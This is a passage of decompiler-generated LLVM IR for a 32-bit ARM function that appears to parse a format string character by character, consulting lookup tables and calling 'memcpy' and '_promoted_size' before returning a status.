  br i1 %v9_1535c, label %dec_label_pc_15364, label %dec_label_pc_155e0

dec_label_pc_15364:                               ; preds = %dec_label_pc_15358, %dec_label_pc_15340
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15368

dec_label_pc_15368:                               ; preds = %dec_label_pc_15318, %dec_label_pc_15364
  %v0_15368 = load i32, i32* @lr, align 4
  %v2_15368 = icmp eq i32 %v0_15368, 0
  br i1 %v2_15368, label %dec_label_pc_15370, label %dec_label_pc_15188

dec_label_pc_15370:                               ; preds = %dec_label_pc_15368
  %v0_15370 = load i32, i32* %r6.global-to-local, align 4
  %v1_15370 = inttoptr i32 %v0_15370 to i8*
  %v2_15370 = load i8, i8* %v1_15370, align 1
  %v3_15370 = zext i8 %v2_15370 to i32
  store i32 %v3_15370, i32* %r3.global-to-local, align 4
  %v7_15374 = icmp eq i8 %v2_15370, 46
  br i1 %v7_15374, label %.thread22, label %dec_label_pc_15388

.thread22:                                        ; preds = %dec_label_pc_15370
  %v2_15378 = add i32 %v0_15370, 1
  store i32 %v2_15378, i32* %r6.global-to-local, align 4
  %v1_1537c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_1537c, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_151f0

dec_label_pc_15388:                               ; preds = %dec_label_pc_15370
  %v0_15388 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15388, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15390

dec_label_pc_15390:                               ; preds = %dec_label_pc_15188, %dec_label_pc_15388
  %v0_15398.pre = phi i32 [ %v0_15370, %dec_label_pc_15388 ], [ %v0_15398.pre.pre, %dec_label_pc_15188 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_15388 ], [ %v0_15188, %dec_label_pc_15188 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1f64c.922 to i32), i32* %r1.global-to-local, align 4
  %v1_15398 = inttoptr i32 %v0_15398.pre to i8*
  br label %dec_label_pc_15394

dec_label_pc_15394:                               ; preds = %dec_label_pc_153a4, %dec_label_pc_15390
  %v0_153a4 = phi i32 [ %v1_153a4, %dec_label_pc_153a4 ], [ ptrtoint ([9 x i8]* @global_var_1f64c.922 to i32), %dec_label_pc_15390 ]
  %v1_15394 = inttoptr i32 %v0_153a4 to i8*
  %v2_15394 = load i8, i8* %v1_15394, align 1
  %v3_15394 = zext i8 %v2_15394 to i32
  store i32 %v3_15394, i32* %r2.global-to-local, align 4
  %v2_15398 = load i8, i8* %v1_15398, align 1
  %v3_15398 = zext i8 %v2_15398 to i32
  store i32 %v3_15398, i32* %r3.global-to-local, align 4
  %v9_1539c = icmp eq i8 %v2_15398, %v2_15394
  br i1 %v9_1539c, label %dec_label_pc_15190, label %dec_label_pc_153a4

dec_label_pc_153a4:                               ; preds = %dec_label_pc_15394
  %v1_153a4 = add i32 %v0_153a4, 1
  %v2_153a4 = inttoptr i32 %v1_153a4 to i8*
  %v3_153a4 = load i8, i8* %v2_153a4, align 1
  %v4_153a4 = zext i8 %v3_153a4 to i32
  store i32 %v4_153a4, i32* %r3.global-to-local, align 4
  store i32 %v1_153a4, i32* %r1.global-to-local, align 4
  %v2_153a8 = icmp eq i8 %v3_153a4, 0
  br i1 %v2_153a8, label %dec_label_pc_153b0, label %dec_label_pc_15394

dec_label_pc_153b0:                               ; preds = %dec_label_pc_153a4, %dec_label_pc_15190
  %v1_153d0 = phi i32 [ %v1_15190, %dec_label_pc_15190 ], [ %v0_15398.pre, %dec_label_pc_153a4 ]
  %v1_153cc = phi i32 [ %v0_153a4, %dec_label_pc_15190 ], [ %v1_153a4, %dec_label_pc_153a4 ]
  %v2_153b4 = sub i32 %v1_153cc, ptrtoint ([9 x i8]* @global_var_1f64c.922 to i32)
  store i32 %v2_153b4, i32* %r3.global-to-local, align 4
  %v8_153bc = icmp sgt i32 %v2_153b4, 1
  br i1 %v8_153bc, label %.thread25, label %dec_label_pc_153c0

dec_label_pc_153c0:                               ; preds = %dec_label_pc_153b0
  %v1_153c0 = inttoptr i32 %v1_153d0 to i8*
  %v2_153c0 = load i8, i8* %v1_153c0, align 1
  %v3_153c0 = zext i8 %v2_153c0 to i32
  store i32 %v3_153c0, i32* %r2.global-to-local, align 4
  %v1_153c4 = inttoptr i32 %v1_153cc to i8*
  %v2_153c4 = load i8, i8* %v1_153c4, align 1
  %v3_153c4 = zext i8 %v2_153c4 to i32
  store i32 %v3_153c4, i32* %r3.global-to-local, align 4
  %v9_153c8 = icmp eq i8 %v2_153c0, %v2_153c4
  br i1 %v9_153c8, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_153c0
  %v2_153cc = add i32 %v1_153cc, 9
  store i32 %v2_153cc, i32* %r1.global-to-local, align 4
  %v2_153d0 = add i32 %v1_153d0, 1
  store i32 %v2_153d0, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_153c0, %dec_label_pc_153b0, %bb135
  %v0_153d8 = phi i32 [ %v1_153cc, %dec_label_pc_153c0 ], [ %v1_153cc, %dec_label_pc_153b0 ], [ %v2_153cc, %bb135 ]
  %v0_153d4 = phi i32 [ %v1_153d0, %dec_label_pc_153c0 ], [ %v1_153d0, %dec_label_pc_153b0 ], [ %v2_153d0, %bb135 ]
  %v1_153d4 = inttoptr i32 %v0_153d4 to i8*
  %v2_153d4 = load i8, i8* %v1_153d4, align 1
  %v3_153d4 = zext i8 %v2_153d4 to i32
  store i32 %v3_153d4, i32* %r2.global-to-local, align 4
  %v1_153d8 = add i32 %v0_153d8, 9
  %v2_153d8 = inttoptr i32 %v1_153d8 to i8*
  %v3_153d8 = load i8, i8* %v2_153d8, align 1
  %v4_153d8 = zext i8 %v3_153d8 to i32
  store i32 %v4_153d8, i32* %r3.global-to-local, align 4
  %v2_153dc = icmp eq i8 %v2_153d4, 0
  %v3_153e0 = mul nuw nsw i32 %v4_153d8, 256
  store i32 %v3_153e0, i32* @lr, align 4
  br i1 %v2_153dc, label %dec_label_pc_155e0, label %dec_label_pc_153e8

dec_label_pc_153e8:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_1f68c.924 to i32), i32* %ip.global-to-local, align 4
  %v3_153ec = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_153ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_153f0

dec_label_pc_153f0:                               ; preds = %dec_label_pc_15474, %dec_label_pc_153e8
  %v1_15400 = phi i32 [ %v1_15474, %dec_label_pc_15474 ], [ ptrtoint ([21 x i8]* @global_var_1f68c.924 to i32), %dec_label_pc_153e8 ]
  %v1_153f0 = inttoptr i32 %v1_15400 to i8*
  %v2_153f0 = load i8, i8* %v1_153f0, align 1
  %v3_153f0 = zext i8 %v2_153f0 to i32
  store i32 %v3_153f0, i32* %r3.global-to-local, align 4
  %v9_153f4 = icmp eq i8 %v2_153f0, %v2_153d4
  br i1 %v9_153f4, label %dec_label_pc_153fc, label %dec_label_pc_15474

dec_label_pc_153fc:                               ; preds = %dec_label_pc_153f0
  store i32 ptrtoint ([21 x i8]* @global_var_1f68c.924 to i32), i32* %r3.global-to-local, align 4
  %v2_15400 = sub i32 %v1_15400, ptrtoint ([21 x i8]* @global_var_1f68c.924 to i32)
  store i32 %v2_15400, i32* %r2.global-to-local, align 4
  %v7_15408 = icmp slt i32 %v2_15400, 18
  br i1 %v7_15408, label %bb137, label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %dec_label_pc_153fc
  %v1_1540c = and i32 %v3_153e0, 1024
  %v2_1540c = icmp eq i32 %v1_1540c, 0
  br i1 %v2_1540c, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_1540c
  %v2_15410 = add i32 %v2_15400, -2
  store i32 %v2_15410, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_153fc, %dec_label_pc_1540c, %bb136
  %v0_15414 = phi i32 [ %v2_15400, %dec_label_pc_153fc ], [ %v2_15400, %dec_label_pc_1540c ], [ %v2_15410, %bb136 ]
  %v1_15414 = load i32, i32* %r7.global-to-local, align 4
  %v2_15414 = add i32 %v1_15414, 32
  %v3_15414 = inttoptr i32 %v2_15414 to i32*
  store i32 %v0_15414, i32* %v3_15414, align 4
  store i32 ptrtoint (i32* @global_var_1f67f.926 to i32), i32* %r1.global-to-local, align 4
  %v0_15420.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1541c

dec_label_pc_1541c:                               ; preds = %dec_label_pc_1541c, %bb137
  %v0_1541c = phi i32 [ %v1_1541c, %dec_label_pc_1541c ], [ ptrtoint (i32* @global_var_1f67f.926 to i32), %bb137 ]
  %v1_1541c = add i32 %v0_1541c, 1
  %v2_1541c = inttoptr i32 %v1_1541c to i8*
  %v3_1541c = load i8, i8* %v2_1541c, align 1
  %v4_1541c = zext i8 %v3_1541c to i32
  store i32 %v4_1541c, i32* %r3.global-to-local, align 4
  store i32 %v1_1541c, i32* %r1.global-to-local, align 4
  %v8_15424 = icmp sgt i32 %v0_15420.pre, %v4_1541c
  br i1 %v8_15424, label %dec_label_pc_1541c, label %dec_label_pc_15428

dec_label_pc_15428:                               ; preds = %dec_label_pc_1541c
  store i32 ptrtoint (i32* @global_var_1f670.930 to i32), i32* %r0.global-to-local, align 4
  %v2_15430 = sub i32 %v1_1541c, ptrtoint (i32* @global_var_1f680.928 to i32)
  %v2_15434 = mul i32 %v2_15430, 2
  store i32 %v2_15434, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f660.932 to i32), i32* %ip.global-to-local, align 4
  %v2_1543c = add i32 %v2_15434, ptrtoint (i32* @global_var_1f670.930 to i32)
  store i32 %v2_1543c, i32* %r2.global-to-local, align 4
  %v1_15440 = add i32 %v2_15434, add (i32 ptrtoint (i32* @global_var_1f670.930 to i32), i32 1)
  %v2_15440 = inttoptr i32 %v1_15440 to i8*
  %v3_15440 = load i8, i8* %v2_15440, align 1
  %v4_15440 = zext i8 %v3_15440 to i32
  store i32 %v4_15440, i32* %r1.global-to-local, align 4
  %v2_15444 = add i32 %v2_15434, ptrtoint (i32* @global_var_1f660.932 to i32)
  store i32 %v2_15444, i32* %r2.global-to-local, align 4
  %v3_15448 = inttoptr i32 %v2_1543c to i8*
  %v4_15448 = load i8, i8* %v3_15448, align 2
  %v6_15448 = zext i8 %v4_15448 to i32
  store i32 %v6_15448, i32* %r0.global-to-local, align 4
  %v1_1544c = add i32 %v2_15434, add (i32 ptrtoint (i32* @global_var_1f660.932 to i32), i32 1)
  %v2_1544c = inttoptr i32 %v1_1544c to i8*
  %v3_1544c = load i8, i8* %v2_1544c, align 1
  %v4_1544c = zext i8 %v3_1544c to i32
  store i32 %v4_1544c, i32* %r2.global-to-local, align 4
  %v3_15450 = inttoptr i32 %v2_15444 to i8*
  %v4_15450 = load i8, i8* %v3_15450, align 2
  %v6_15450 = zext i8 %v4_15450 to i32
  %v3_15454 = mul nuw i32 %v4_15440, 16777216
  store i32 %v3_15454, i32* %r1.global-to-local, align 4
  %v4_15458 = sdiv i32 %v3_15454, 65536
  %v5_15458 = or i32 %v6_15448, %v4_15458
  %v3_1545c = mul nuw i32 %v4_1544c, 16777216
  store i32 %v3_1545c, i32* %r2.global-to-local, align 4
  %v4_15460 = sdiv i32 %v3_1545c, 65536
  %v5_15460 = or i32 %v6_15450, %v4_15460
  store i32 %v5_15460, i32* %r3.global-to-local, align 4
  %v0_15464 = load i32, i32* @lr, align 4
  %v2_15464 = or i32 %v5_15458, %v0_15464
  store i32 ptrtoint ([21 x i8]* @global_var_1f68c.924 to i32), i32* %ip.global-to-local, align 4
  %v2_1546c = and i32 %v2_15464, %v5_15460
  store i32 %v2_1546c, i32* %r0.global-to-local, align 4
  %v0_15488.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15480

dec_label_pc_15474:                               ; preds = %dec_label_pc_153f0
  %v1_15474 = add i32 %v1_15400, 1
  %v2_15474 = inttoptr i32 %v1_15474 to i8*
  %v3_15474 = load i8, i8* %v2_15474, align 1
  %v4_15474 = zext i8 %v3_15474 to i32
  store i32 %v4_15474, i32* %r3.global-to-local, align 4
  store i32 %v1_15474, i32* %ip.global-to-local, align 4
  %v2_15478 = icmp eq i8 %v3_15474, 0
  br i1 %v2_15478, label %dec_label_pc_15480, label %dec_label_pc_153f0

dec_label_pc_15480:                               ; preds = %dec_label_pc_15474, %dec_label_pc_15428
  %v0_1548c = phi i32 [ %v0_15464, %dec_label_pc_15428 ], [ %v3_153e0, %dec_label_pc_15474 ]
  %v0_15488 = phi i32 [ %v0_15488.pre, %dec_label_pc_15428 ], [ %v0_153d4, %dec_label_pc_15474 ]
  %v0_15480 = phi i32 [ %v2_1546c, %dec_label_pc_15428 ], [ %v3_153ec, %dec_label_pc_15474 ]
  store i32 %v0_15480, i32* %stack_var_-36, align 4
  %v0_15484 = load i32, i32* @r4, align 4
  %v1_15484 = and i32 %v0_15484, 4
  %v1_15488 = inttoptr i32 %v0_15488 to i8*
  %v2_15488 = load i8, i8* %v1_15488, align 1
  %v3_15488 = zext i8 %v2_15488 to i32
  store i32 %v3_15488, i32* %r1.global-to-local, align 4
  %v1_1548c = and i32 %v0_1548c, 3840
  %v1_15490 = and i32 %v0_15484, -5
  %v2_15494 = or i32 %v1_15490, %v1_1548c
  store i32 %v2_15494, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_15484, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_154a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_154a4 = add i32 %v1_154a4, 12
  %v3_154a4 = inttoptr i32 %v2_154a4 to i32*
  store i32 %v3_15488, i32* %v3_154a4, align 4
  %v0_154a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_154a8 = add i32 %v0_154a8, 4
  %v2_154a8 = inttoptr i32 %v1_154a8 to i32*
  %v3_154a8 = load i32, i32* @r5, align 4
  store i32 %v3_154a8, i32* %v2_154a8, align 4
  %v4_154a8 = add i32 %v0_154a8, 8
  %v5_154a8 = inttoptr i32 %v4_154a8 to i32*
  %v6_154a8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_154a8, i32* %v5_154a8, align 4
  %v0_154ac = load i32, i32* %r3.global-to-local, align 4
  %v1_154ac = load i32, i32* %r7.global-to-local, align 4
  %v2_154ac = add i32 %v1_154ac, 20
  %v3_154ac = inttoptr i32 %v2_154ac to i32*
  store i32 %v0_154ac, i32* %v3_154ac, align 4
  %v0_154b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_154b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_154b0 = add i32 %v1_154b0, 16
  %v3_154b0 = inttoptr i32 %v2_154b0 to i32*
  store i32 %v0_154b0, i32* %v3_154b0, align 4
  %v0_154b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_154b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_154b4 = add i32 %v1_154b4, 28
  %v3_154b4 = inttoptr i32 %v2_154b4 to i32*
  store i32 %v0_154b4, i32* %v3_154b4, align 4
  %v0_154b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_154b8 = inttoptr i32 %v0_154b8 to i8*
  %v2_154b8 = load i8, i8* %v1_154b8, align 1
  %v3_154b8 = zext i8 %v2_154b8 to i32
  store i32 %v3_154b8, i32* %r2.global-to-local, align 4
  %v2_154bc = icmp eq i8 %v2_154b8, 0
  br i1 %v2_154bc, label %dec_label_pc_154c4, label %dec_label_pc_154dc

dec_label_pc_154c4:                               ; preds = %dec_label_pc_15480
  %v0_154c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_154c4 = inttoptr i32 %v0_154c4 to i8*
  %v2_154c4 = load i8, i8* %v1_154c4, align 1
  %v3_154c4 = zext i8 %v2_154c4 to i32
  store i32 %v3_154c4, i32* %r3.global-to-local, align 4
  %v7_154c8 = icmp eq i8 %v2_154c4, 109
  br i1 %v7_154c8, label %dec_label_pc_154d0, label %dec_label_pc_155e0

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154c4
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_154d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_154d4 = add i32 %v1_154d4, 32
  %v3_154d4 = inttoptr i32 %v2_154d4 to i32*
  store i32 20, i32* %v3_154d4, align 4
  %v0_154d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_154d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_154d8 = add i32 %v1_154d8, 28
  %v3_154d8 = inttoptr i32 %v2_154d8 to i32*
  store i32 %v0_154d8, i32* %v3_154d8, align 4
  br label %dec_label_pc_154dc

dec_label_pc_154dc:                               ; preds = %dec_label_pc_15480, %dec_label_pc_154d0
  %v0_154dc = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_154dc, 1
  br i1 %tmp141, label %dec_label_pc_15594, label %dec_label_pc_154e4

dec_label_pc_154e4:                               ; preds = %dec_label_pc_154dc
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_154e8

dec_label_pc_154e8:                               ; preds = %dec_label_pc_1557c, %dec_label_pc_154e4
  %v8_15504 = phi i32 [ 0, %dec_label_pc_154e4 ], [ %v1_15580, %dec_label_pc_1557c ]
  %v7_154ec = icmp sgt i32 %v8_15504, 2
  br i1 %v7_154ec, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_154e8
  store i32 %v25_1514c, i32* %r2.global-to-local, align 4
  %v12_154f0 = mul i32 %v8_15504, 4
  %v13_154f0 = add i32 %v12_154f0, %v25_1514c
  store i32 %v13_154f0, i32* %r3.global-to-local, align 4
  %v9_154f4 = add i32 %v13_154f0, -24
  %v10_154f4 = inttoptr i32 %v9_154f4 to i32*
  %v11_154f4 = load i32, i32* %v10_154f4, align 4
  store i32 %v11_154f4, i32* %r2.global-to-local, align 4
  %v9_154f8 = load i32, i32* %r7.global-to-local, align 4
  %v10_154f8 = add i32 %v9_154f8, %v8_15504
  store i32 %v10_154f8, i32* %r3.global-to-local, align 4
  %v9_15500 = trunc i32 %v11_154f4 to i8
  %v11_15500 = add i32 %v10_154f8, 36
  %v12_15500 = inttoptr i32 %v11_15500 to i8*
  store i8 %v9_15500, i8* %v12_15500, align 1
  %v8_15508 = load i32, i32* %r3.global-to-local, align 4
  %v9_15508 = add i32 %v8_15508, 36
  %v10_15508 = inttoptr i32 %v9_15508 to i8*
  %v11_15508 = load i8, i8* %v10_15508, align 1
  %v12_15508 = zext i8 %v11_15508 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_154e8
  %v10_15504 = add i32 %v8_15504, %stack_var_-48.3
  store i32 %v10_15504, i32* %r3.global-to-local, align 4
  %v9_1550c = add i32 %v10_15504, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_15530 = phi i32 [ %v12_15508, %bb142 ], [ %v9_1550c, %bb143 ]
  store i32 %v0_15530, i32* @r2, align 4
  %v1_15510 = load i32, i32* %sb.global-to-local, align 4
  %v2_15510 = sub i32 %v0_15530, %v1_15510
  %v4_15510 = xor i32 %v1_15510, %v0_15530
  %v5_15510 = xor i32 %v2_15510, %v0_15530
  %v6_15510 = and i32 %v5_15510, %v4_15510
  %v7_15510 = icmp slt i32 %v6_15510, 0
  %v8_15510 = icmp slt i32 %v2_15510, 0
  %v9_15510 = icmp eq i32 %v0_15530, %v1_15510
  %v3_15514 = xor i1 %v8_15510, %v7_15510
  %v4_15514 = or i1 %v9_15510, %v3_15514
  br i1 %v4_15514, label %dec_label_pc_15524, label %dec_label_pc_15518

dec_label_pc_15518:                               ; preds = %bb144
  %v1_15518 = add i32 %v0_15530, -9
  %v3_15518 = sub i32 8, %v0_15530
  %v4_15518 = and i32 %v3_15518, %v0_15530
  %v5_15518 = icmp slt i32 %v4_15518, 0
  %v6_15518 = icmp slt i32 %v1_15518, 0
  %v7_15518 = icmp eq i32 %v0_15530, 9
  %v3_1551c = xor i1 %v6_15518, %v5_15518
  %v4_1551c = or i1 %v7_15518, %v3_1551c
  br i1 %v4_1551c, label %dec_label_pc_15520, label %dec_label_pc_155e0

dec_label_pc_15520:                               ; preds = %dec_label_pc_15518
  store i32 %v0_15530, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15524

dec_label_pc_15524:                               ; preds = %bb144, %dec_label_pc_15520
  store i32 %v25_1514c, i32* %ip.global-to-local, align 4
  %v1_15528 = load i32, i32* %r8.global-to-local, align 4
  %v4_15528 = mul i32 %v1_15528, 4
  %v5_15528 = add i32 %v4_15528, %v25_1514c
  store i32 %v5_15528, i32* %r3.global-to-local, align 4
  %v1_1552c = add i32 %v5_15528, -12
  %v2_1552c = inttoptr i32 %v1_1552c to i32*
  %v3_1552c = load i32, i32* %v2_1552c, align 4
  store i32 %v3_1552c, i32* %r5.global-to-local, align 4
  %v1_15530 = add i32 %v0_15530, -1
  store i32 %v1_15530, i32* %sl.global-to-local, align 4
  %v0_15534 = load i32, i32* %r7.global-to-local, align 4
  %v4_15534 = mul i32 %v1_15530, 4
  %v5_15534 = add i32 %v0_15534, %v4_15534
  store i32 %v5_15534, i32* %r3.global-to-local, align 4
  %v7_15538 = icmp eq i32 %v3_1552c, 8
  %v1_1553c = add i32 %v5_15534, 40
  %v2_1553c = inttoptr i32 %v1_1553c to i32*
  %v3_1553c = load i32, i32* %v2_1553c, align 4
  store i32 %v3_1553c, i32* @r0, align 4
  br i1 %v7_15538, label %dec_label_pc_1557c, label %dec_label_pc_15544

dec_label_pc_15544:                               ; preds = %dec_label_pc_15524
  %v9_15544 = icmp eq i32 %v3_1553c, %v3_1552c
  br i1 %v9_15544, label %dec_label_pc_15568, label %bb145

bb145:                                            ; preds = %dec_label_pc_15544
  %v8_15548 = icmp eq i32 %v3_1553c, 8
  br i1 %v8_15548, label %dec_label_pc_15568, label %dec_label_pc_15550

dec_label_pc_15550:                               ; preds = %bb145
  %v0_15550 = call i32 @_promoted_size()
  %v0_15558 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15558, i32* @r0, align 4
  %v0_1555c = call i32 @_promoted_size()
  store i32 %v0_1555c, i32* %r0.global-to-local, align 4
  %v8_15564 = icmp sgt i32 %v0_15550, %v0_1555c
  br i1 %v8_15564, label %dec_label_pc_1557c, label %dec_label_pc_15550.dec_label_pc_15568_crit_edge

dec_label_pc_15550.dec_label_pc_15568_crit_edge:  ; preds = %dec_label_pc_15550
  %v1_1556c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15574.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_15574.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15568

dec_label_pc_15568:                               ; preds = %dec_label_pc_15550.dec_label_pc_15568_crit_edge, %dec_label_pc_15544, %bb145
  %v1_15574 = phi i32 [ %v1_15574.pre, %dec_label_pc_15550.dec_label_pc_15568_crit_edge ], [ %v1_15530, %dec_label_pc_15544 ], [ %v1_15530, %bb145 ]
  %v0_15574 = phi i32 [ %v0_15574.pre, %dec_label_pc_15550.dec_label_pc_15568_crit_edge ], [ %v0_15534, %dec_label_pc_15544 ], [ %v0_15534, %bb145 ]
  %v1_1556c = phi i32 [ %v1_1556c.pre, %dec_label_pc_15550.dec_label_pc_15568_crit_edge ], [ %v1_15528, %dec_label_pc_15544 ], [ %v1_15528, %bb145 ]
  store i32 %v25_1514c, i32* %r1.global-to-local, align 4
  %v4_1556c = mul i32 %v1_1556c, 4
  %v5_1556c = add i32 %v4_1556c, %v25_1514c
  store i32 %v5_1556c, i32* %r3.global-to-local, align 4
  %v1_15570 = add i32 %v5_1556c, -12
  %v2_15570 = inttoptr i32 %v1_15570 to i32*
  %v3_15570 = load i32, i32* %v2_15570, align 4
  store i32 %v3_15570, i32* @r2, align 4
  %v4_15574 = mul i32 %v1_15574, 4
  %v5_15574 = add i32 %v4_15574, %v0_15574
  store i32 %v5_15574, i32* %r3.global-to-local, align 4
  %v2_15578 = add i32 %v5_15574, 40
  %v3_15578 = inttoptr i32 %v2_15578 to i32*
  store i32 %v3_15570, i32* %v3_15578, align 4
  br label %dec_label_pc_1557c

dec_label_pc_1557c:                               ; preds = %dec_label_pc_15550, %dec_label_pc_15524, %dec_label_pc_15568
  %v0_1557c = load i32, i32* %r7.global-to-local, align 4
  %v1_1557c = add i32 %v0_1557c, 28
  %v2_1557c = inttoptr i32 %v1_1557c to i32*
  %v3_1557c = load i32, i32* %v2_1557c, align 4
  %v0_15580 = load i32, i32* %r8.global-to-local, align 4
  %v1_15580 = add i32 %v0_15580, 1
  store i32 %v1_15580, i32* %r8.global-to-local, align 4
  %v1_15584 = add i32 %v3_1557c, 2
  store i32 %v1_15584, i32* %r3.global-to-local, align 4
  %v6_1558c = icmp slt i32 %v1_15580, %v1_15584
  br i1 %v6_1558c, label %dec_label_pc_154e8, label %dec_label_pc_155ac

dec_label_pc_15594:                               ; preds = %dec_label_pc_154dc
  %v0_15594 = load i32, i32* %r7.global-to-local, align 4
  %v1_15594 = add i32 %v0_15594, 28
  %v2_15594 = inttoptr i32 %v1_15594 to i32*
  %v3_15594 = load i32, i32* %v2_15594, align 4
  store i32 %v3_15594, i32* %r2.global-to-local, align 4
  %v0_15598 = load i32, i32* %r0.global-to-local, align 4
  %v1_15598 = trunc i32 %v0_15598 to i8
  %v3_15598 = add i32 %v0_15594, 38
  %v4_15598 = inttoptr i32 %v3_15598 to i8*
  store i8 %v1_15598, i8* %v4_15598, align 1
  %v0_1559c = load i32, i32* %r2.global-to-local, align 4
  %v3_1559c = mul i32 %v0_1559c, 4
  store i32 %v3_1559c, i32* @r2, align 4
  %v0_155a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_155a0 = add i32 %v0_155a0, 40
  store i32 %v1_155a0, i32* @r0, align 4
  %v2_155a4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_155a4, i32* @r1, align 4
  %v0_155a8 = call i32 @memcpy()
  store i32 %v0_155a8, i32* %r0.global-to-local, align 4
  %v0_155ac.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_155ac

dec_label_pc_155ac:                               ; preds = %dec_label_pc_1557c, %dec_label_pc_15594
  %v2_155c8 = phi i32 [ %v0_155ac.pre, %dec_label_pc_15594 ], [ %v0_1557c, %dec_label_pc_1557c ]
  %v1_155ac = add i32 %v2_155c8, 16
  %v2_155ac = inttoptr i32 %v1_155ac to i32*
  %v3_155ac = load i32, i32* %v2_155ac, align 4
  store i32 %v3_155ac, i32* %r3.global-to-local, align 4
  %v1_155b0 = and i32 %v3_155ac, 128
  %v2_155b0 = icmp eq i32 %v1_155b0, 0
  br i1 %v2_155b0, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_155ac
  store i32 %v2_15154, i32* %r3.global-to-local, align 4
  %v2_155b8 = inttoptr i32 %v2_155c8 to i32*
  %v3_155b8 = load i32, i32* %v2_155b8, align 4
  %v2_155c0.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_155c0 = sub i32 %v2_155c0.pre, %v2_15154
  store i32 %v3_155c0, i32* %r3.global-to-local, align 4
  %v5_155c4 = mul i32 %v3_155c0, 4
  %v6_155c4 = add i32 %v5_155c4, %v3_155b8
  store i32 %v6_155c4, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_155ac
  %v1_155bc41 = load i32, i32* %r6.global-to-local, align 4
  %v2_155bc42 = add i32 %v1_155bc41, 1
  store i32 %v2_155bc42, i32* %r3.global-to-local, align 4
  %v3_155c8 = inttoptr i32 %v2_155c8 to i32*
  store i32 %v2_155bc42, i32* %v3_155c8, align 4
  %v0_155cc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_155d4 = phi i32 [ %v2_155c8, %.thread44 ], [ %v0_155cc.pre, %.thread46 ]
  %v1_155cc = add i32 %v1_155d4, 28
  %v2_155cc = inttoptr i32 %v1_155cc to i32*
  %v3_155cc = load i32, i32* %v2_155cc, align 4
  store i32 %v3_155cc, i32* %r3.global-to-local, align 4
  %v1_155d0 = add i32 %v3_155cc, 2
  store i32 %v1_155d0, i32* %r0.global-to-local, align 4
  %v0_155d4 = load i32, i32* %sb.global-to-local, align 4
  %v2_155d4 = add i32 %v1_155d4, 24
  %v3_155d4 = inttoptr i32 %v2_155d4 to i32*
  store i32 %v0_155d4, i32* %v3_155d4, align 4
  br i1 %v2_155b0, label %dec_label_pc_155e4, label %bb147

bb147:                                            ; preds = %bb146
  %v1_155d8 = load i32, i32* @r2, align 4
  %v2_155d8 = load i32, i32* %r7.global-to-local, align 4
  %v3_155d8 = inttoptr i32 %v2_155d8 to i32*
  store i32 %v1_155d8, i32* %v3_155d8, align 4
  br label %dec_label_pc_155e4

dec_label_pc_155e0:                               ; preds = %dec_label_pc_1519c, %dec_label_pc_152a8, %dec_label_pc_15358, %dec_label_pc_1532c, %dec_label_pc_15338, %dec_label_pc_15278, %dec_label_pc_15518, %dec_label_pc_154c4, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %bb147, %bb146, %dec_label_pc_155e0
  %v2_155e8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_155e8, i32* @r4, align 4
  store i32 %v6_1514c, i32* @r5, align 4
  %v26_155e8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_155e8

; uselistorder directives
